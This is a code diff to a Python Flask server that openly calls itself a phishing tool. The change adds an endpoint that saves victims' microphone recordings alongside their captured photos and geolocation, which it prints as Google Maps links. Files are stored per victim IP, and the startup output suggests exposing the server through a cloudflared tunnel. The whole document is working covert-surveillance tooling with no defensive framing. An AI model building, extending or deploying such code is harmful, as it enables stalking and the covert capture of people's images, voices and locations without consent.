@@ -1,6 +1,6 @@
 """
-NOOBSTER PHISHING TOOL v2.0
-Local mode. Saves ONLY photo + location. Everything else on terminal.
+NOOBSTER PHISHING TOOL v2.1
+Local mode. Saves photo + location + audio. Everything else on terminal.
 
 Telegram: https://t.me/noob11001
 """
@@ -27,10 +27,10 @@ BANNER = r"""
 ║    ███╗   ██╗ ██████╗  ██████╗ ██████╗ ███████╗████████╗     ║
 ║    ████╗  ██║██╔═══██╗██╔═══██╗██╔══██╗██╔════╝╚══██╔══╝     ║
 ║    ██╔██╗ ██║██║   ██║██║   ██║██████╔╝███████╗   ██║        ║
-║    ██║╚██╗ ██║██║   ██║██║   ██║██╔══██╗╚════██║   ██║        ║
+║    ██║╚██╗██║██║   ██║██║   ██║██╔══██╗╚════██║   ██║        ║
 ║    ██║ ╚████║╚██████╔╝╚██████╔╝██████╔╝███████║   ██║        ║
 ║    ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚══════╝   ╚═╝        ║
-║              P H I S H I N G   T O O L   v2.0                ║
+║              P H I S H I N G   T O O L   v2.1                ║
 ║                  t.me/noob11001                              ║
 ╚══════════════════════════════════════════════════════════════╝
 """
@@ -161,6 +161,24 @@ def cap_photo():
     return jsonify({"ok": 1})
 
 
+# ─── AUDIO — SAVE ───
+@app.route("/capture/audio", methods=["POST"])
+def cap_audio():
+    if not STATE["active_page"]:
+        abort(404)
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    page = request.form.get("page", "?")
+    folder = new_folder(ip, page)
+    t = datetime.now().strftime("%H-%M-%S")
+    f = request.files.get("audio")
+    if f:
+        path = os.path.join(folder, f"audio_{t}.webm")
+        f.save(path)
+        size_kb = os.path.getsize(path) // 1024
+        print(f"  {C.G}🎤 Audio saved{C.N}  {C.D}{path} ({size_kb} KB){C.N}")
+    return jsonify({"ok": 1})
+
+
 # ─── LOCATION — SAVE ───
 @app.route("/capture/location", methods=["POST"])
 def cap_loc():
@@ -171,7 +189,6 @@ def cap_loc():
     page = d.get("page", "?")
     folder = new_folder(ip, page)
 
-    # save
     path = os.path.join(folder, "location.json")
     with open(path, "w", encoding="utf-8") as f:
         json.dump({
@@ -184,7 +201,6 @@ def cap_loc():
     if lat is not None:
         gmaps = f"https://maps.google.com/?q={lat},{lon}"
         print(f"  {C.G}📍 Location saved{C.N}  {C.D}{gmaps} (±{int(d.get('accuracy',0))}m){C.N}")
-        print(f"  {C.D}   → {path}{C.N}")
     return jsonify({"ok": 1})
 
 
@@ -301,7 +317,7 @@ def boot():
     print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}")
     print(f"  {C.Cc}Local   :{C.N} {C.W}http://127.0.0.1:5000/{p['slug']}{C.N}")
     print(f"  {C.Cc}Expose  :{C.N} {C.D}cloudflared tunnel --url http://localhost:5000{C.N}")
-    print(f"  {C.Cc}Saves   :{C.N} {C.D}only photo + location{C.N}")
+    print(f"  {C.Cc}Saves   :{C.N} {C.D}photo + audio + location{C.N}")
     print(f"{C.BOLD}{C.M}{'═' * 66}{C.N}\n")
     app.run(host="0.0.0.0", port=5000, debug=False)
 
